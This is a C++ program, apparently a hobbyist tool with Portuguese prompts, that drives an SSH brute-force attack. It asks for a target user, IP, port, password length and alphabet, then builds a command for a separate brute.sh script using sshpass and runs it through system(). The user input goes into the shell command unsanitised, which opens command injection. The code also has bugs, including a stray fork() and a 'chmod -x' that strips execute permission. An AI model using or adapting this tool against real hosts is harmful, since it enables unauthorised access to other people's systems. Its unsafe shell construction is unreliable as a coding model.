#include <stdio.h>
#include<string>
#include<unistd.h>
#include<iostream>

using namespace std;

//Funcao para limpar stdin linux
void flush_in()
{
   int ch;

   while( (ch = fgetc(stdin)) != EOF && ch != '\n' ){}
}


int main(int argc, char* argv[]){
	pid_t pid = fork();

	cout << "Meu PID eh =" << getpid();
	cout << " - ";
	cout << "Child PID eh ="<< pid;
	cout << " <<-->>";

	//Variaveis
	string usr;
	string ip;
	string port;
	char type;
	string rg;
	string cmz;
	
	printf("\n\n=================================>//Programa de Brute Force//<=====================================\n\n");
	printf("Para o uso deste programa eh necessario que o arquivo shell script brute.sh estaja no mesmo diretorio.\n");
	printf("Este script faz uso do pacote sshpass.\n");
	printf("Sudo apt-get sshpass (instalacao do pacote adicional).\n");
	printf("Chmod -755 brute.sh (permissao de execucao).\n\n");
	
	//usuario
	printf("\nQual usuario do alvo:");
	cin >> usr;
	flush_in();
	
	//ip
	printf("\nQual o ip do alvo:");
	cin >> ip;
	flush_in();

	//porta
	printf("\nQual a porta do alvo:");
	cin >> port;
	flush_in();

	//tamanho senha
	printf("\nQual o tamanho da senha:");
	cin >> rg;
	flush_in();

	//menu de alfabetos
	printf("\nDigite o tipo de alfabeto a ser usado:");
	printf("\n-d		Alfabeto decimal 0-9");
	printf("\n-a		Alfabeto minusculo a-z");
	printf("\n-A		Alfabeto maiusculo A-Z");
	printf("\n-c [ ]		Alfabeto customizado\n");
	scanf("%c",&type);

	//caso alfabeto customizado
	if(type == 'c'){
		flush_in();
		printf("\nDigite o alfabeto:");
		cin >> cmz;
		flush_in();
	}

	//strings auxiliar
	string usrr = "./brute.sh -u ";
	string ipp=" -i ";
	string porta=" -p ";
	string tipo=" -";
	string tam=" -r ";
	string line;
	
	//concatenacao da linha de comando
	if(type == 'c'){
		string asp = "\"";
		string esp = " ";
		line=usrr+usr+ipp+ip+porta+port+tipo+type+esp+asp+cmz+asp+tam+rg;	
	}else{
		line=usrr+usr+ipp+ip+porta+port+tipo+type+tam+rg;	
	}
	
	//Chamada de shell script
	int sts=0;
	sts=system(line.c_str());
	if(sts == 32256){
		system("chmod -x brute.sh");
		system(line.c_str());
	}else if( sts == 256){
		exit(0);
	}



}
